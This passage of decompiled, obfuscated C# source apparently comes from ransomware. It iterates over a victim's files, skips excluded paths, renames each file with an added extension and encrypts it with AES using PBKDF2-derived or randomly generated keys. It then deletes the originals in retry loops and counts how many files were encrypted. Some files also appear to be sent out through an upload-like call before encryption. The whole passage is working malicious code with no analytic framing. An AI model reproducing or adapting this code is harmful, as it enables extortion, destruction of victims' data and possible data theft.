					CS_0024_003C_003E8__locals0.irMLgePJDX.Remove(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.irMLgePJDX, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new rMKsTJZgha.yNAeEToLAJLz();
			CS_0024_003C_003E8__locals0.aXSAfIkYbfct = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.DTaZlHbaazgUn = string_0;
			if (!CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107352003)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351978)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351945)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351960)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351403)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351410)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351389)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351344)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351331)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351326)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351317)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351268)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351242)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351253)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351228)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351179)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351194)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351657)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351672)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351623)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351638)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351589)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351608)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351555)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351574)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351529)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351544)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351495)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(gUlAYNDfQee(rMKsTJZgha.getString_0(107351510))) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351485)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107397151)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351440)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.EndsWith(CS_0024_003C_003E8__locals0.QxykwlAceQFylEg) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.EndsWith(rMKsTJZgha.getString_0(107351447)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.EndsWith(rMKsTJZgha.getString_0(107351442)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.EndsWith(rMKsTJZgha.getString_0(107350893)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.EndsWith(rMKsTJZgha.getString_0(107350888)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107350883)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(tBpNkaUiwdaB) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(kZGwVMpcMFQGdu) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(BVDNRoTnEzf))
			{
				if (CS_0024_003C_003E8__locals0.boaEQxNXtIuKCtPO.Length != 0)
				{
					string[] boaEQxNXtIuKCtPO = CS_0024_003C_003E8__locals0.boaEQxNXtIuKCtPO;
					int num = 0;
					while (num < boaEQxNXtIuKCtPO.Length)
					{
						string value = boaEQxNXtIuKCtPO[num];
						if (!CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1094;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.EndsWith(CS_0024_003C_003E8__locals0.QxykwlAceQFylEg))
					{
						goto IL_1094;
					}
				}
				catch (Exception)
				{
					goto IL_1094;
				}
				if (!aAbwlpshQJNC.Contains(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn))
				{
					if (kdgdQzLhNzqB == rMKsTJZgha.getString_0(107396901))
					{
						try
						{
							if (mnpRWvvbrJgHv.cJzqbOCqGLtS(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn))
							{
								mnpRWvvbrJgHv.WtlWQnLheONJif(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
							}
						}
						catch
						{
						}
					}
					aAbwlpshQJNC.Add(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (sHBjpbgVmkra)
							{
								Console.WriteLine(rMKsTJZgha.yNAeEToLAJLz.getString_0(107365802) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + rMKsTJZgha.yNAeEToLAJLz.getString_0(107365699) + new FileInfo(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn).Length + rMKsTJZgha.yNAeEToLAJLz.getString_0(107365646));
								Console.WriteLine(rMKsTJZgha.yNAeEToLAJLz.getString_0(107365233), aAbwlpshQJNC.Count, iRDeCsZxbW, YZVmksVDGrCDMh);
								Console.WriteLine(rMKsTJZgha.yNAeEToLAJLz.getString_0(107365176), zTfquIuAKrE.Elapsed);
								Console.WriteLine(rMKsTJZgha.yNAeEToLAJLz.getString_0(107365669));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!AknjtLUSQgBf.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn)))
					{
						AknjtLUSQgBf.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn));
					}
					bHpvAtayIadi(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
					try
					{
						new OAxPYfdUYtB().kBVxeUnZtOC(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (sHBjpbgVmkra)
								{
									Console.WriteLine(rMKsTJZgha.getString_0(107365702) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107365689) + new FileInfo(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn).Length + rMKsTJZgha.getString_0(107365636));
									Console.WriteLine(rMKsTJZgha.getString_0(107365659));
								}
							}
							catch
							{
							}
							pPOxzMkmHSA(gUlAYNDfQee(rMKsTJZgha.getString_0(107365554)), rMKsTJZgha.getString_0(107350799) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107350799) + gUlAYNDfQee(rMKsTJZgha.getString_0(107365529)) + rMKsTJZgha.getString_0(107350799) + Environment.UserName + rMKsTJZgha.getString_0(107350799) + gUlAYNDfQee(rMKsTJZgha.getString_0(107365992)));
						}
					}
					catch (Exception ex2)
					{
						if (IOdNTzsqoZWVAC)
						{
							try
							{
								File.AppendAllText(kZGwVMpcMFQGdu, rMKsTJZgha.getString_0(107349240) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107365967) + ex2.Message + rMKsTJZgha.getString_0(107396673));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn).Length != 0L)
							{
								goto end_IL_0887;
							}
							goto end_IL_0887_2;
							end_IL_0887:;
						}
						catch (Exception ex4)
						{
							if (IOdNTzsqoZWVAC)
							{
								try
								{
									File.AppendAllText(kZGwVMpcMFQGdu, rMKsTJZgha.getString_0(107349240) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107365918) + ex4.Message + rMKsTJZgha.getString_0(107396673));
								}
								catch (Exception)
								{
								}
							}
							YZVmksVDGrCDMh++;
							goto end_IL_0887_2;
						}
						if (dHRyeOBeWtyqJR == rMKsTJZgha.getString_0(107396901) && new FileInfo(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn).Length > Convert.ToInt32(XaBojWlRQDbFIzp) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.QxykwlAceQFylEg != rMKsTJZgha.getString_0(107349478))
								{
									if (gmYGIhcbzDElW)
									{
										CS_0024_003C_003E8__locals0.QxykwlAceQFylEg = lEGlvoOLHlud + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg;
									}
									File.Move(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg);
								}
							}
							catch (Exception ex6)
							{
								if (IOdNTzsqoZWVAC)
								{
									try
									{
										File.AppendAllText(kZGwVMpcMFQGdu, rMKsTJZgha.getString_0(107349240) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107365825) + ex6.Message + rMKsTJZgha.getString_0(107396673));
									}
									catch (Exception)
									{
									}
								}
								YZVmksVDGrCDMh++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.QxykwlAceQFylEg != rMKsTJZgha.getString_0(107349478))
							{
								CS_0024_003C_003E8__locals0.DTaZlHbaazgUn += CS_0024_003C_003E8__locals0.QxykwlAceQFylEg;
							}
							if (ttlCPfUMAnPPn == rMKsTJZgha.getString_0(107396901))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in RpGcCAInLIz)
									{
										if (CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.aXSAfIkYbfct.QxykwlAceQFylEg) && ymVKGiHEgE == rMKsTJZgha.yNAeEToLAJLz.getString_0(107396911))
										{
											if (Convert.ToInt32(MJsJJqYMMt) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn).Length)
											{
												try
												{
													mYaTrXhnsaDz.jPGIJOflxVN(rMKsTJZgha.yNAeEToLAJLz.getString_0(107352670), rMKsTJZgha.yNAeEToLAJLz.getString_0(107352633), rMKsTJZgha.yNAeEToLAJLz.getString_0(107352620), CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().EndsWith(item2) && ymVKGiHEgE == rMKsTJZgha.yNAeEToLAJLz.getString_0(107397021))
										{
											try
											{
												mYaTrXhnsaDz.jPGIJOflxVN(rMKsTJZgha.yNAeEToLAJLz.getString_0(107352670), rMKsTJZgha.yNAeEToLAJLz.getString_0(107352633), rMKsTJZgha.yNAeEToLAJLz.getString_0(107352620), CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							string text = lOiJKLXYNaE.EUcJjWziQBK(32);
							string text2 = rMKsTJZgha.getString_0(107352547);
							text2 = (JsBIHINLdKrOq ? lOiJKLXYNaE.sKpHBCLYxr() : rMKsTJZgha.getString_0(107352547));
							string s = jHvXcQAocngrZWa.UXBKErjXJpX(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (fRCrnusObo == rMKsTJZgha.getString_0(107397011))
							{
								byte[] array = null;
								byte[] byte_ = kkKbYndBNVRIq.IVisBGGKLwj(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, Convert.ToInt32(XaBojWlRQDbFIzp) * 1024 * 1024);
								if (!kkKbYndBNVRIq.cOUmRprntfS(fWbWouVUtQb: (!ZdrpEPuTKVdNM) ? (JsBIHINLdKrOq ? kkKbYndBNVRIq.ZhgCAqtDUPafD(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : kkKbYndBNVRIq.ZhgCAqtDUPafD(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MKXSGZQsex), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (JsBIHINLdKrOq ? ljGMsJUyXoVokMGC.ktwhezfiBVAUNLi(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : ljGMsJUyXoVokMGC.ktwhezfiBVAUNLi(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MKXSGZQsex), Convert.FromBase64String(tHaxFjXwOLKb))), mMkGcFwOyALFJP: CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, wNHkPJFScGyAC: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!JsBIHINLdKrOq)
							{
								if (!EBBCbHTQPFk.RLENGbvKOVkQ(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, XaBojWlRQDbFIzp, CS_0024_003C_003E8__locals0.MKXSGZQsex, null, Convert.FromBase64String(tHaxFjXwOLKb)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!EBBCbHTQPFk.RLENGbvKOVkQ(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, XaBojWlRQDbFIzp, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (gmYGIhcbzDElW)
							{
								CS_0024_003C_003E8__locals0.QxykwlAceQFylEg = lEGlvoOLHlud + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg;
							}
							string text3 = lOiJKLXYNaE.EUcJjWziQBK(32);
							string text4 = rMKsTJZgha.getString_0(107352547);
							text4 = (JsBIHINLdKrOq ? lOiJKLXYNaE.sKpHBCLYxr() : rMKsTJZgha.getString_0(107352547));
							string s2 = jHvXcQAocngrZWa.UXBKErjXJpX(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.QxykwlAceQFylEg != rMKsTJZgha.getString_0(107349478))
							{
								if (!XRrWKEvMyEJKuU)
								{
									if (!JsBIHINLdKrOq)
									{
										rVYEpwebTUtQK(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, LkftepqeXsefTk);
									}
									else
									{
										rVYEpwebTUtQK(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!JsBIHINLdKrOq)
										{
											GiEPJrlkxkyBC(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, LkftepqeXsefTk, Convert.FromBase64String(tHaxFjXwOLKb));
										}
										else
										{
											GiEPJrlkxkyBC(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (IOdNTzsqoZWVAC)
										{
											try
											{
												File.AppendAllText(kZGwVMpcMFQGdu, rMKsTJZgha.getString_0(107349240) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107349496) + ex11.Message + rMKsTJZgha.getString_0(107396673));
											}
											catch (Exception)
											{
											}
										}
										YZVmksVDGrCDMh++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!XRrWKEvMyEJKuU)
							{
								if (!JsBIHINLdKrOq)
								{
									rVYEpwebTUtQK(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107349473), LkftepqeXsefTk);
								}
								else
								{
									rVYEpwebTUtQK(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107349473), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!JsBIHINLdKrOq)
									{
										GiEPJrlkxkyBC(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, LkftepqeXsefTk, Convert.FromBase64String(tHaxFjXwOLKb));
									}
									else
									{
										GiEPJrlkxkyBC(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (IOdNTzsqoZWVAC)
									{
										try
										{
											File.AppendAllText(kZGwVMpcMFQGdu, rMKsTJZgha.getString_0(107349240) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107349496) + ex14.Message + rMKsTJZgha.getString_0(107396673));
										}
										catch (Exception)
										{
										}
									}
									YZVmksVDGrCDMh++;
									return;
								}
							}
							if (JsBIHINLdKrOq)
							{
								if (CS_0024_003C_003E8__locals0.QxykwlAceQFylEg != rMKsTJZgha.getString_0(107349478))
								{
									LoqGoLvZhSEzLPF(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, bytes2);
								}
								else
								{
									LoqGoLvZhSEzLPF(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, bytes2);
								}
							}
						}
						end_IL_0887_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1094;
			IL_1094:
			CS_0024_003C_003E8__locals0.irMLgePJDX.Remove(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
		});
	}

	private static void YvrEgPECnvyZYScBi(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (ttlCPfUMAnPPn == getString_0(107396883))
					{
						foreach (string item in RpGcCAInLIz)
						{
							if (string_0.ToLower().EndsWith(item) && ymVKGiHEgE == getString_0(107396883))
							{
								if (Convert.ToInt32(MJsJJqYMMt) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										mYaTrXhnsaDz.jPGIJOflxVN(getString_0(107352642), getString_0(107352605), getString_0(107352592), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && ymVKGiHEgE == getString_0(107396993))
							{
								try
								{
									mYaTrXhnsaDz.jPGIJOflxVN(getString_0(107352642), getString_0(107352605), getString_0(107352592), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107349455)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107349455), getString_0(107352529)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void GiEPJrlkxkyBC(string MWcBEtVzrgf, string AHHDRHeuExdwVMsF, byte[] XaLMZHuPLdfxxtZ, byte[] cGmefMGfxVClBz = null)
	{
		try
		{
			if (ttlCPfUMAnPPn == getString_0(107396883))
			{
				FileStream fileStream = new FileStream(MWcBEtVzrgf, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in RpGcCAInLIz)
				{
					if (MWcBEtVzrgf.ToLower().EndsWith(item) && ymVKGiHEgE == getString_0(107396883))
					{
						if (Convert.ToInt32(MJsJJqYMMt) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								mYaTrXhnsaDz.jPGIJOflxVN(getString_0(107352642), getString_0(107352605), getString_0(107352592), MWcBEtVzrgf);
							}
							catch
							{
							}
						}
					}
					else if (MWcBEtVzrgf.ToLower().EndsWith(item) && ymVKGiHEgE == getString_0(107396993))
					{
						try
						{
							mYaTrXhnsaDz.jPGIJOflxVN(getString_0(107352642), getString_0(107352605), getString_0(107352592), MWcBEtVzrgf);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (MWcBEtVzrgf != AHHDRHeuExdwVMsF)
		{
			File.Move(MWcBEtVzrgf, AHHDRHeuExdwVMsF);
			MWcBEtVzrgf = AHHDRHeuExdwVMsF;
		}
		byte[] bytes = ljGMsJUyXoVokMGC.ktwhezfiBVAUNLi(File.ReadAllBytes(MWcBEtVzrgf), XaLMZHuPLdfxxtZ, cGmefMGfxVClBz);
		File.WriteAllBytes(MWcBEtVzrgf, bytes);
		iRDeCsZxbW++;
	}

	private static void rVYEpwebTUtQK(string string_0, string string_1, byte[] byte_0)
	{
		oFrPqQzOlPWjPPJE CS_0024_003C_003E8__locals0 = new oFrPqQzOlPWjPPJE();
		CS_0024_003C_003E8__locals0.GfqifsEJMyhuJ = string_0;
		CS_0024_003C_003E8__locals0.AJFITcSiTZAbRQ = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string aJFITcSiTZAbRQ = CS_0024_003C_003E8__locals0.AJFITcSiTZAbRQ;
			FileStream fileStream = new FileStream(aJFITcSiTZAbRQ, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (jdWvevqcLSOo == getString_0(107396883))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.GfqifsEJMyhuJ, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.GfqifsEJMyhuJ, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.GfqifsEJMyhuJ, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.AJFITcSiTZAbRQ.Length > 0)
				{
					if (ttlCPfUMAnPPn == getString_0(107396883))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.GfqifsEJMyhuJ, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in RpGcCAInLIz)
						{
							if (CS_0024_003C_003E8__locals0.GfqifsEJMyhuJ.ToLower().EndsWith(item) && ymVKGiHEgE == getString_0(107396883))
							{
								if (Convert.ToInt32(MJsJJqYMMt) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										mYaTrXhnsaDz.jPGIJOflxVN(getString_0(107352642), getString_0(107352605), getString_0(107352592), CS_0024_003C_003E8__locals0.GfqifsEJMyhuJ);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.GfqifsEJMyhuJ.ToLower().EndsWith(item) && ymVKGiHEgE == getString_0(107396993))
							{
								try
								{
									mYaTrXhnsaDz.jPGIJOflxVN(getString_0(107352642), getString_0(107352605), getString_0(107352592), CS_0024_003C_003E8__locals0.GfqifsEJMyhuJ);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.GfqifsEJMyhuJ);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.AJFITcSiTZAbRQ.EndsWith(getString_0(107349455)))
					{
						File.Move(CS_0024_003C_003E8__locals0.AJFITcSiTZAbRQ, CS_0024_003C_003E8__locals0.AJFITcSiTZAbRQ.Replace(getString_0(107349455), getString_0(107352529)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.AJFITcSiTZAbRQ))
							{
								File.Delete(CS_0024_003C_003E8__locals0.AJFITcSiTZAbRQ);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (IOdNTzsqoZWVAC)
			{
				try
				{
